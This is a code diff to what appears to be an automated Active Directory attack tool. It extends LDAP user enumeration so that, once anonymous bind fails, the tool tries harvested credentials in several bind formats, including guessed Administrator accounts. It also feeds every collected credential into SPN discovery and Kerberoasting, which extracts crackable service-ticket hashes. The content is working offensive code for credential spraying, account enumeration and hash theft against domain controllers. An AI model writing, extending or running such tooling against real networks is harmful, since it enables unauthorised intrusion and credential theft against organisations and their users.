@@ -175,9 +175,11 @@ def _derive_domain(host_record: dict) -> Optional[str]:
 # Stage A: LDAP anonymous bind
 # ---------------------------------------------------------------------------
 
-def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389) -> dict:
+def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389,
+                        credentials: list[dict] | None = None) -> dict:
     """
-    Attempt anonymous LDAP bind and enumerate user objects.
+    Attempt LDAP enumeration: try anonymous bind first, then authenticated
+    bind with any available credentials if anonymous fails.
 
     Returns:
         {
@@ -194,8 +196,10 @@ def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389) -> dict:
 
     # Build the base DN from domain (neutron.local -> DC=neutron,DC=local)
     base_dn = ",".join(f"DC={part}" for part in domain.split("."))
-    _log(f"  LDAP anonymous bind -> {dc_ip}:{port}  base_dn={base_dn}")
 
+    # --- Try anonymous bind first ---
+    _log(f"  LDAP anonymous bind -> {dc_ip}:{port}  base_dn={base_dn}")
+    conn = None
     try:
         server = Server(dc_ip, port=port, get_info=ALL, connect_timeout=10)
         conn = Connection(
@@ -204,14 +208,88 @@ def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389) -> dict:
             auto_bind=True,
             receive_timeout=15,
         )
-    except LDAPException as exc:
-        result["error"] = f"LDAP bind failed: {exc}"
-        _log(f"  LDAP bind error: {exc}")
+    except (LDAPException, Exception) as exc:
+        _log(f"  LDAP anonymous bind failed: {exc}")
+        conn = None
+
+    users = _ldap_search_users(conn, base_dn) if conn else []
+    if conn:
+        try:
+            conn.unbind()
+        except Exception:
+            pass
+
+    if users:
+        result["success"] = True
+        result["users"] = users
         return result
-    except Exception as exc:
-        result["error"] = f"Connection error: {exc}"
-        _log(f"  LDAP connection error: {exc}")
+
+    # --- Anonymous bind returned nothing; try authenticated bind ---
+    if not credentials:
+        result["error"] = "LDAP search returned no results (anonymous bind may be restricted)"
+        _log("  LDAP search returned no results")
         return result
+
+    _log("  Anonymous LDAP returned no results — trying authenticated bind")
+    for cred in credentials:
+        username = cred.get("username", "")
+        password = cred.get("password", "")
+        cred_domain = cred.get("domain") or domain
+        if not username or not password:
+            continue
+
+        # Try multiple bind formats
+        bind_attempts = [
+            f"{domain.split('.')[0].upper()}\\{username}",   # NEUTRON\admin
+            f"{username}@{domain}",                           # admin@neutron.local
+            f"{domain.split('.')[0].upper()}\\Administrator", # NEUTRON\Administrator
+            f"Administrator@{domain}",                        # Administrator@neutron.local
+        ]
+        # Deduplicate while preserving order
+        seen = set()
+        unique_binds = []
+        for b in bind_attempts:
+            if b not in seen:
+                seen.add(b)
+                unique_binds.append(b)
+
+        for bind_user in unique_binds:
+            _log(f"  LDAP authenticated bind as {bind_user} -> {dc_ip}:{port}")
+            try:
+                server = Server(dc_ip, port=port, get_info=ALL, connect_timeout=10)
+                conn = Connection(
+                    server,
+                    user=bind_user,
+                    password=password,
+                    auto_bind=True,
+                    receive_timeout=15,
+                )
+            except (LDAPException, Exception) as exc:
+                _log(f"    Bind failed: {exc}")
+                continue
+
+            users = _ldap_search_users(conn, base_dn)
+            try:
+                conn.unbind()
+            except Exception:
+                pass
+
+            if users:
+                result["success"] = True
+                result["users"] = users
+                _log(f"  Authenticated LDAP succeeded as {bind_user}: {len(users)} users")
+                return result
+            else:
+                _log(f"    Bind succeeded but search returned 0 users")
+
+    result["error"] = "LDAP search returned no results (anonymous and authenticated)"
+    return result
+
+
+def _ldap_search_users(conn, base_dn: str) -> list[str]:
+    """Run LDAP user search on an established connection. Returns list of usernames."""
+    if conn is None:
+        return []
 
     # Try AD filter first, fall back to RFC-2307/OpenLDAP filter
     search_attempts = [
@@ -219,8 +297,6 @@ def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389) -> dict:
         ("(objectClass=inetOrgPerson)", ["uid", "cn", "mail"]),
     ]
 
-    entries = []
-    used_attrs: list[str] = []
     for search_filter, attrs in search_attempts:
         try:
             ok = conn.search(
@@ -235,40 +311,25 @@ def ldap_anonymous_enum(dc_ip: str, domain: str, port: int = 389) -> dict:
             _log(f"  LDAP search error ({search_filter}): {exc}")
             continue
         if ok and conn.entries:
-            entries = conn.entries
-            used_attrs = attrs
             _log(f"  LDAP search matched using filter {search_filter}")
-            break
+            users = []
+            for entry in conn.entries:
+                username = None
+                try:
+                    username = str(entry.sAMAccountName.value) if entry.sAMAccountName else None
+                except Exception:
+                    pass
+                if not username:
+                    try:
+                        username = str(entry.uid.value) if entry.uid else None
+                    except Exception:
+                        pass
+                if username and username.strip() and username.strip().lower() not in ("", "$"):
+                    users.append(username.strip())
+            _log(f"  LDAP enumeration: found {len(users)} user accounts")
+            return users
 
-    if not entries:
-        result["error"] = "LDAP search returned no results (anonymous bind may be restricted)"
-        _log("  LDAP search returned no results")
-        conn.unbind()
-        return result
-
-    users = []
-    for entry in entries:
-        username = None
-        # AD path
-        try:
-            username = str(entry.sAMAccountName.value) if entry.sAMAccountName else None
-        except Exception:
-            pass
-        # OpenLDAP path
-        if not username:
-            try:
-                username = str(entry.uid.value) if entry.uid else None
-            except Exception:
-                pass
-        if username and username.strip() and username.strip().lower() not in ("", "$"):
-            users.append(username.strip())
-
-    conn.unbind()
-
-    result["success"] = True
-    result["users"] = users
-    _log(f"  LDAP enumeration: found {len(users)} user accounts")
-    return result
+    return []
 
 
 # ---------------------------------------------------------------------------
@@ -498,7 +559,7 @@ def kerberoast(dc_ip: str, domain: str, credentials: list[dict]) -> list[str]:
 
         # Enumerate SPNs via LDAP then request TGS for each
         _log("  TGT obtained; enumerating SPNs via LDAP for Kerberoasting")
-        spn_users = _get_spn_users(dc_ip, domain)
+        spn_users = _get_spn_users(dc_ip, domain, credentials)
         if not spn_users:
             _log("  No SPN accounts found")
             break
@@ -587,37 +648,66 @@ def kerberoast_subprocess(
     return hashes
 
 
-def _get_spn_users(dc_ip: str, domain: str) -> list[tuple[str, str]]:
+def _get_spn_users(dc_ip: str, domain: str,
+                    credentials: list[dict] | None = None) -> list[tuple[str, str]]:
     """
     Query LDAP for user accounts with servicePrincipalName set.
     Returns list of (spn_string, sAMAccountName) tuples.
+    Tries anonymous bind first, then authenticated if anonymous fails.
     """
     if not LDAP3_AVAILABLE:
         return []
 
-    spn_users: list[tuple[str, str]] = []
     base_dn = ",".join(f"DC={part}" for part in domain.split("."))
+    search_filter = "(&(objectClass=user)(servicePrincipalName=*))"
+    attrs = ["sAMAccountName", "servicePrincipalName"]
 
+    def _search_spns(conn) -> list[tuple[str, str]]:
+        results: list[tuple[str, str]] = []
+        try:
+            conn.search(base_dn, search_filter, search_scope=SUBTREE,
+                        attributes=attrs, time_limit=20)
+            for entry in conn.entries:
+                sam  = str(entry.sAMAccountName.value) if entry.sAMAccountName else ""
+                spns = entry.servicePrincipalName.values if entry.servicePrincipalName else []
+                for spn in spns:
+                    results.append((str(spn), sam))
+        except Exception as exc:
+            _log(f"  SPN LDAP search error: {exc}")
+        return results
+
+    # Try anonymous first
     try:
         server = Server(dc_ip, port=389, get_info=ALL, connect_timeout=10)
-        conn   = Connection(server, authentication=ANONYMOUS, auto_bind=True, receive_timeout=15)
-        conn.search(
-            base_dn,
-            "(&(objectClass=user)(servicePrincipalName=*))",
-            search_scope=SUBTREE,
-            attributes=["sAMAccountName", "servicePrincipalName"],
-            time_limit=20,
-        )
-        for entry in conn.entries:
-            sam  = str(entry.sAMAccountName.value) if entry.sAMAccountName else ""
-            spns = entry.servicePrincipalName.values if entry.servicePrincipalName else []
-            for spn in spns:
-                spn_users.append((str(spn), sam))
+        conn = Connection(server, authentication=ANONYMOUS, auto_bind=True, receive_timeout=15)
+        spn_users = _search_spns(conn)
         conn.unbind()
-    except Exception as exc:
-        _log(f"  SPN LDAP query failed: {exc}")
+        if spn_users:
+            return spn_users
+    except Exception:
+        pass
 
-    return spn_users
+    # Try authenticated
+    if credentials:
+        for cred in credentials:
+            username = cred.get("username", "")
+            password = cred.get("password", "")
+            if not username or not password:
+                continue
+            bind_user = f"{domain.split('.')[0].upper()}\\{username}"
+            try:
+                server = Server(dc_ip, port=389, get_info=ALL, connect_timeout=10)
+                conn = Connection(server, user=bind_user, password=password,
+                                  auto_bind=True, receive_timeout=15)
+                spn_users = _search_spns(conn)
+                conn.unbind()
+                if spn_users:
+                    _log(f"  SPN query succeeded (authenticated as {bind_user})")
+                    return spn_users
+            except Exception:
+                continue
+
+    return []
 
 
 def _format_tgs_hash(username: str, spn: str, domain: str, tgs_data: bytes) -> str:
@@ -890,10 +980,12 @@ def run() -> dict:
             primary_domain = domain
             primary_dc_ip  = dc_ip
 
-        # --- A: LDAP anonymous bind ---
+        # --- A: LDAP enumeration (anonymous then authenticated) ---
         ldap_port = _ldap_port(dc)
         if ldap_port is not None:
-            ldap_result = ldap_anonymous_enum(dc_ip, domain, port=ldap_port)
+            ldap_result = ldap_anonymous_enum(
+                dc_ip, domain, port=ldap_port, credentials=existing_creds,
+            )
             if ldap_result["success"]:
                 for u in ldap_result["users"]:
                     if u not in all_users:
@@ -915,10 +1007,11 @@ def run() -> dict:
 
         # --- C: Kerberoasting (credentials required) ---
         if _port_open(dc, 88) or _ldap_port(dc) is not None:
-            # Merge domain credentials that match this domain (or are generic)
+            # Try all available credentials — we don't know which ones are
+            # domain accounts until we try.  Filter out obviously empty ones.
             domain_creds = [
                 c for c in existing_creds
-                if c.get("domain", "").lower() in (domain.lower(), "", "unknown")
+                if c.get("username") and c.get("password")
             ]
             if domain_creds:
                 tgs_hashes = kerberoast(dc_ip, domain, domain_creds)
